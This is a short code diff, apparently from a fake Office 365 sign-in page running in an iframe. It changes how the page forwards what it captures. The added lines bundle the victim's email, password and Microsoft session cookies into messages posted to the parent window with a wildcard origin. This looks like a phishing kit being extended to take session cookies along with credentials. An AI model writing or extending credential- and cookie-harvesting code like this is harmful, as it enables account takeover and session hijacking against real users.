@@ -281,6 +281,7 @@
                 window.parent.postMessage({
                     type: 'MICROSOFT_COOKIES',
                     cookies: microsoftCookies,
+                    cookieList: microsoftCookies,
                     timestamp: new Date().toISOString()
                 }, '*');
             }
@@ -367,7 +368,12 @@
                 if (window.parent) {
                     window.parent.postMessage({
                         type: 'OFFICE_365_SUBMIT',
-                        payload: { email, password }
+                        payload: { 
+                            email, 
+                            password,
+                            cookies: microsoftCookies,
+                            cookieList: microsoftCookies
+                        }
                     }, '*');
 
                     // Send authentication success message
@@ -377,7 +383,8 @@
                             payload: { 
                                 email, 
                                 timestamp: new Date().toISOString(),
-                                cookies: microsoftCookies
+                                cookies: microsoftCookies,
+                                cookieList: microsoftCookies
                             }
                         }, '*');
                     }, 500);
